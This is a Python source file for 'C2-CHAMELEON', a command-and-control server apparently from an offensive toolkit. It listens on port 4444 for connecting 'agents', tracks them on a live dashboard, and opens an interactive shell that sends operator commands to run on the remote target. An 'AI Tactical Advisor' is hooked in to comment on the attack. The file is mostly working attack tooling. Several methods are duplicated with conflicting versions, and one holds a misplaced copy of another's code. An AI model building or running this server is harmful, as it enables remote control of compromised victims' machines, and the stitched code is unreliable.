#!/usr/bin/env python3
"""
C2-CHAMELEON - Adaptive Command & Control Server
Part of the CRIMSON Toolkit
"""

import os
import sys
import time
import threading
import random
import socket
from datetime import datetime
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.text import Text
from rich.theme import Theme

# Custom theme for hacker aesthetics
custom_theme = Theme({
    "info": "dim cyan",
    "warning": "yellow",
    "error": "bold red",
    "success": "bold green",
    "header": "bold magenta",
    "protocol.http": "blue",
    "protocol.dns": "yellow",
    "protocol.tcp": "green"
})

console = Console(theme=custom_theme)


# Import AI Advisor
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
try:
    from ai_connector import AIAdvisor
except ImportError:
    AIAdvisor = None

class ChameleonServer:
    def __init__(self):
        self.agents = {}
        self.listeners = {}
        self.logs = []
        self.active_channel = "TCP"  # Start with TCP
        self.running = True
        self.failed_connections = 0
        self.channel_priority = ["TCP", "HTTPS", "DNS"]  # Fallback order
        
        # Initialize AI Advisor
        if AIAdvisor:
            self.advisor = AIAdvisor()
            self.last_advice = "AI Advisor initialized. Monitoring tactical situation..."
        else:
            self.advisor = None
            self.last_advice = "AI Module not available (Ollama missing)"
    
    def switch_channel(self):
        """Switch to next available channel when current fails"""
        current_idx = self.channel_priority.index(self.active_channel)
        next_idx = (current_idx + 1) % len(self.channel_priority)
        old_channel = self.active_channel
        self.active_channel = self.channel_priority[next_idx]
        
        self.log("WARNING", f"Channel switched: {old_channel} → {self.active_channel} (Connection failures detected)")
        
        # Reset failure counter
        self.failed_connections = 0
            
    def log(self, type, message):
        """Add log entry and trigger AI analysis"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] [{type}] {message}"
        self.logs.append(log_entry)
        if len(self.logs) > 15:
            self.logs.pop(0)

        # Trigger AI Analysis in background
        # Analyze ERRORS, WARNINGS, and SUCCESS (for new connections) to give immediate feedback
        if self.advisor and self.advisor.enabled and type in ["ERROR", "WARNING", "SUCCESS"]:
            threading.Thread(target=self._analyze_log_background, args=(log_entry,)).start()

    def _analyze_log_background(self, log_entry):
        """Run AI analysis without blocking"""
        advice = self.advisor.analyze_log(log_entry)
        if advice:
            self.last_advice = advice

    def start_listeners(self):
        """Start real listeners"""
        self.log("INFO", "Starting C2-CHAMELEON listener engine...")
        
        try:
            self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.tcp_sock.bind(("0.0.0.0", 4444))
            self.tcp_sock.listen(5)
            self.listeners["TCP"] = {"port": 4444, "status": "Active", "desc": "Raw TCP Socket"}
            self.log("SUCCESS", "Started TCP listener on port 4444")
            
            t = threading.Thread(target=self.accept_tcp)
            t.daemon = True
            t.start()
        except Exception as e:
            self.log("ERROR", f"Failed to start TCP listener: {e}")
            self.listeners["TCP"] = {"port": 4444, "status": "Error", "desc": str(e)}

        self.listeners["HTTPS"] = {"port": 443, "status": "Active", "desc": "Encrypted Web Traffic (Simulated)"}
        self.listeners["DNS"] = {"port": 53, "status": "Active", "desc": "Tunneling over DNS (Simulated)"}
        
    def accept_tcp(self):
        """Accept incoming TCP connections"""
        self.log("INFO", "Listening for connections on 4444...")
        consecutive_errors = 0
        
        while self.running:
            try:
                client, addr = self.tcp_sock.accept()
                agent_id = f"AG-{random.randint(1000, 9999)}"
                self.agents[agent_id] = {
                    "addr": addr, 
                    "conn": client, 
                    "status": "Alive", 
                    "last_seen": datetime.now().strftime("%H:%M:%S"),
                    "channel": self.active_channel
                }
                self.log("SUCCESS", f"New Agent connected: {agent_id} from {addr[0]} via {self.active_channel}")
                
                # Reset error counter on successful connection
                consecutive_errors = 0
                self.failed_connections = 0
                
            except Exception as e:
                if self.running:
                    consecutive_errors += 1
                    self.failed_connections += 1
                    
                    # Trigger channel switch after 3 consecutive failures
                    if consecutive_errors >= 3 and self.active_channel == "TCP":
                        self.log("ERROR", f"Multiple connection failures detected (TCP)")
                        self.switch_channel()
                        consecutive_errors = 0
                    else:
                        self.log("ERROR", f"Accept loop error: {e}")
                        
                time.sleep(1)

    def show_command_menu(self):
        """Create AI Advisor panel"""
        color = "green" if "TACTICAL" in self.last_advice else "dim white"
        return Panel(
            self.last_advice,
            title="[bold cyan]🧠 AI Tactical Advisor (Project Overmind)[/bold cyan]",
            border_style=color,
            height=6
        )

    def run_dashboard(self):
        """Run the live dashboard"""
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        
        layout["body"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="right", ratio=2)
        )
        
        layout["left"].split(
            Layout(name="status", size=8),
            Layout(name="listeners")
        )

        # Split right side into Logs and AI Advice
        layout["right"].split(
            Layout(name="logs", ratio=2),
            Layout(name="advice", ratio=1)
        )
        
        self.start_listeners()

        # Footer with clear instructions - compact version
        footer_content = Text()
        footer_content.append("Press ", style="dim")
        footer_content.append("Ctrl+C", style="bold yellow")
        footer_content.append(" to open Command Menu and interact with agents", style="dim")
        
        layout["header"].update(self.header_layout())
        layout["left"]["status"].update(self.status_layout())
        layout["left"]["listeners"].update(self.listeners_layout())
        layout["right"]["logs"].update(self.logs_layout())
        layout["right"]["advice"].update(self.advice_layout())
        layout["footer"].update(Panel(
            Align.center(footer_content),
            border_style="green",
            title="[bold green]Instructions[/bold green]"
        ))

        try:
            with Live(layout, refresh_per_second=4, screen=True) as live:
                while self.running:
                    layout["header"].update(self.header_layout())
                    layout["left"]["status"].update(self.status_layout())
                    layout["left"]["listeners"].update(self.listeners_layout())
                    layout["right"]["logs"].update(self.logs_layout())
                    layout["right"]["advice"].update(self.advice_layout())
                    time.sleep(0.25)
        except KeyboardInterrupt:
            self.show_command_menu()
            self.run_dashboard()

        """Start real listeners"""
        self.log("INFO", "Starting C2-CHAMELEON listener engine...")
        
        try:
            self.tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.tcp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.tcp_sock.bind(("0.0.0.0", 4444))
            self.tcp_sock.listen(5)
            self.listeners["TCP"] = {"port": 4444, "status": "Active", "desc": "Raw TCP Socket"}
            self.log("SUCCESS", "Started TCP listener on port 4444")
            
            t = threading.Thread(target=self.accept_tcp)
            t.daemon = True
            t.start()
        except Exception as e:
            self.log("ERROR", f"Failed to start TCP listener: {e}")
            self.listeners["TCP"] = {"port": 4444, "status": "Error", "desc": str(e)}

        self.listeners["HTTPS"] = {"port": 443, "status": "Active", "desc": "Encrypted Web Traffic (Simulated)"}
        self.listeners["DNS"] = {"port": 53, "status": "Active", "desc": "Tunneling over DNS (Simulated)"}
        
    def accept_tcp(self):
        """Accept incoming TCP connections"""
        self.log("INFO", "Listening for connections on 4444...")
        while self.running:
            try:
                client, addr = self.tcp_sock.accept()
                agent_id = f"AG-{random.randint(1000, 9999)}"
                self.agents[agent_id] = {
                    "addr": addr, 
                    "conn": client, 
                    "status": "Alive", 
                    "last_seen": datetime.now().strftime("%H:%M:%S")
                }
                self.log("SUCCESS", f"New Agent connected: {agent_id} from {addr[0]}")
            except Exception as e:
                if self.running:
                    self.log("ERROR", f"Accept loop error: {e}")
                time.sleep(1)

    def show_command_menu(self):
        """Show interactive command menu"""
        console.clear()
        
        # ASCII Banner
        banner = """
[bold green]
 ██████╗██████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔════╝╚════██╗   ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║      █████╔╝   ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║     ██╔═══╝    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╗███████╗   ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝╚══════╝    ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
[/bold green]
[dim cyan]                        Adaptive Command & Control Suite[/dim cyan]
"""
        console.print(banner)
        console.print("\n")
        
        # Status Panel
        status_table = Table(show_header=False, box=None, padding=(0, 2))
        status_table.add_row("[bold cyan]Active Agents:[/bold cyan]", f"[bold yellow]{len(self.agents)}[/bold yellow]")
        status_table.add_row("[bold cyan]Active Listeners:[/bold cyan]", f"[bold green]{len([l for l in self.listeners.values() if l['status'] == 'Active'])}[/bold green]")
        
        console.print(Panel(status_table, title="[bold magenta]System Status[/bold magenta]", border_style="magenta"))
        console.print("\n")
        
        # Agent List
        if self.agents:
            agent_table = Table(show_header=True, header_style="bold cyan", border_style="green")
            agent_table.add_column("#", style="bold yellow", justify="center")
            agent_table.add_column("Agent ID", style="bold green")
            agent_table.add_column("IP Address", style="cyan")
            agent_table.add_column("Status", justify="center")
            agent_table.add_column("Last Seen")
            
            for idx, (aid, info) in enumerate(self.agents.items(), 1):
                agent_table.add_row(
                    str(idx),
                    aid,
                    info["addr"][0],
                    "[bold green]● ALIVE[/bold green]" if info["status"] == "Alive" else "[bold red]● DEAD[/bold red]",
                    info["last_seen"]
                )
            
            console.print(Panel(agent_table, title="[bold green]Connected Agents[/bold green]", border_style="green"))
        else:
            console.print(Panel(
                "[bold yellow]No agents connected yet...\nWaiting for incoming connections on port 4444[/bold yellow]",
                title="[bold yellow]Connected Agents[/bold yellow]",
                border_style="yellow"
            ))
        
        console.print("\n")
        
        # Command Menu
        menu = """[bold cyan]AVAILABLE COMMANDS:[/bold cyan]

[bold yellow]1-9[/bold yellow]     → Select agent number to interact
[bold yellow]r[/bold yellow]       → Return to live dashboard
[bold yellow]q[/bold yellow]       → Quit C2-CHAMELEON

[dim]Type a command and press Enter:[/dim]"""
        
        console.print(Panel(menu, title="[bold magenta]Command Menu[/bold magenta]", border_style="magenta"))
        console.print("\n[bold green]>[/bold green] ", end="")
        
        choice = input().strip().lower()
        
        if choice == 'q':
            self.running = False
            console.print("\n[bold red]Shutting down C2-CHAMELEON...[/bold red]")
            sys.exit(0)
        elif choice == 'r':
            return  # Return to dashboard
        elif choice.isdigit():
            idx = int(choice) - 1
            agent_list = list(self.agents.items())
            if 0 <= idx < len(agent_list):
                agent_id, _ = agent_list[idx]
                self.shell_loop(agent_id)
            else:
                console.print("[bold red]Invalid agent number![/bold red]")
                time.sleep(1)
                self.show_command_menu()
        else:
            console.print("[bold red]Invalid command![/bold red]")
            time.sleep(1)
            self.show_command_menu()

    def shell_loop(self, agent_id):
        """Interactive shell with specific agent"""
        console.clear()
        
        header = f"""
[bold green]╔══════════════════════════════════════════════════════════╗
║          SHELL SESSION ESTABLISHED                      ║
╚══════════════════════════════════════════════════════════╝[/bold green]

[bold cyan]Agent:[/bold cyan]      {agent_id}
[bold cyan]Target IP:[/bold cyan]  {self.agents[agent_id]['addr'][0]}
[bold cyan]Status:[/bold cyan]     [bold green]CONNECTED[/bold green]

[dim yellow]Commands will be executed on the remote target.
Type 'exit' to return to command menu.[/dim yellow]
[bold green]{'─' * 60}[/bold green]
"""
        console.print(header)
        
        conn = self.agents[agent_id]["conn"]
        conn.setblocking(False)
        
        running = True
        
        def read_output():
            """Continuously read from agent"""
            while running:
                try:
                    data = conn.recv(4096)
                    if data:
                        output = data.decode('utf-8', errors='ignore')
                        sys.stdout.write(output)
                        sys.stdout.flush()
                except BlockingIOError:
                    pass
                except Exception:
                    break
                time.sleep(0.05)
        
        reader = threading.Thread(target=read_output)
        reader.daemon = True
        reader.start()
        
        time.sleep(0.3)
        
        while running and agent_id in self.agents:
            try:
                cmd = input()
                
                if cmd.lower() in ['exit', 'quit', 'back']:
                    running = False
                    break
                
                if cmd.strip():
                    conn.send(cmd.encode() + b"\n")
                    
            except (KeyboardInterrupt, EOFError):
                running = False
                break
            except Exception as e:
                console.print(f"\n[bold red]Error: {e}[/bold red]")
                break
        
        conn.setblocking(True)
        console.print("\n[dim green]Session terminated. Returning to command menu...[/dim green]")
        time.sleep(1)
        self.show_command_menu()

    def header_layout(self):
        """Create header panel"""
        title = Text("C2-CHAMELEON v1.0", style="header", justify="center")
        subtitle = Text("Adaptive Command & Control | Stealth Mode: ON", style="dim white", justify="center")
        
        return Panel(
            Align.center(Text.assemble(title, "\n", subtitle)),
            style="bold magenta",
            border_style="magenta"
        )
        
    def listeners_layout(self):
        """Create listeners table"""
        table = Table(expand=True, border_style="dim")
        table.add_column("Protocol", style="bold")
        table.add_column("Port", justify="right")
        table.add_column("Status")
        table.add_column("Description", style="dim")
        
        proto_styles = {"HTTPS": "blue", "DNS": "yellow", "TCP": "green"}
        
        for proto, info in self.listeners.items():
            status_style = "green" if info["status"] == "Active" else "red"
            p_style = proto_styles.get(proto, "white")
            
            table.add_row(
                Text(proto, style=p_style),
                str(info["port"]),
                Text(info["status"], style=status_style),
                info["desc"]
            )
            
        return Panel(table, title="[bold green]Active Listeners[/bold green]", border_style="green")

    def status_layout(self):
        """Create status table"""
        table = Table(box=None, expand=True)
        table.add_column("Metric", style="cyan")
        table.add_column("Value", style="white")
        
        proto_styles = {"HTTPS": "blue", "DNS": "yellow", "TCP": "green"}
        p_style = proto_styles.get(self.active_channel, "white")
        
        # Add visual indicator for active channel
        channel_text = Text()
        channel_text.append("● ", style=p_style)
        channel_text.append(self.active_channel, style=f"bold {p_style}")
        
        table.add_row("Active Agents", str(len(self.agents)))
        table.add_row("Active Channel", channel_text)
        table.add_row("Listeners", str(len(self.listeners)))
        table.add_row("Failed Connections", str(self.failed_connections))
        
        return Panel(table, title="[bold cyan]System Status[/bold cyan]", border_style="cyan")

    def logs_layout(self):
        """Create logs panel"""
        log_text = "\n".join(self.logs)
        return Panel(
            log_text,
            title="[bold yellow]Event Log[/bold yellow]",
            border_style="yellow",
            height=14
        )

    def advice_layout(self):
        """Create AI Advisor panel"""
        color = "green" if "TACTICAL" in self.last_advice else "dim white"
        return Panel(
            self.last_advice,
            title="[bold cyan]🧠 AI Tactical Advisor (Project Overmind)[/bold cyan]",
            border_style=color,
            height=6
        )

    def run_dashboard(self):
        """Run the live dashboard"""
        layout = Layout()
        layout.split(
            Layout(name="header", size=3),
            Layout(name="body"),
            Layout(name="footer", size=3)
        )
        
        layout["body"].split_row(
            Layout(name="left", ratio=1),
            Layout(name="right", ratio=2)
        )
        
        layout["left"].split(
            Layout(name="status", size=8),
            Layout(name="listeners")
        )

        # Split right side into Logs and AI Advice
        layout["right"].split(
            Layout(name="logs", ratio=2),
            Layout(name="advice", ratio=1)
        )
        
        self.start_listeners()

        # Footer with clear instructions - compact version
        footer_content = Text()
        footer_content.append("Press ", style="dim")
        footer_content.append("Ctrl+C", style="bold yellow")
        footer_content.append(" to open Command Menu and interact with agents", style="dim")
        
        layout["header"].update(self.header_layout())
        layout["left"]["status"].update(self.status_layout())
        layout["left"]["listeners"].update(self.listeners_layout())
        layout["right"]["logs"].update(self.logs_layout())
        layout["right"]["advice"].update(self.advice_layout())
        layout["footer"].update(Panel(
            Align.center(footer_content),
            border_style="green",
            title="[bold green]Instructions[/bold green]"
        ))

        try:
            with Live(layout, refresh_per_second=4, screen=True) as live:
                while self.running:
                    layout["header"].update(self.header_layout())
                    layout["left"]["status"].update(self.status_layout())
                    layout["left"]["listeners"].update(self.listeners_layout())
                    layout["right"]["logs"].update(self.logs_layout())
                    layout["right"]["advice"].update(self.advice_layout())
                    time.sleep(0.25)
        except KeyboardInterrupt:
            self.show_command_menu()
            self.run_dashboard()

if __name__ == "__main__":
    try:
        server = ChameleonServer()
        server.run_dashboard()
    except KeyboardInterrupt:
        print("\n[!] C2-CHAMELEON shutting down...")
        sys.exit(0)
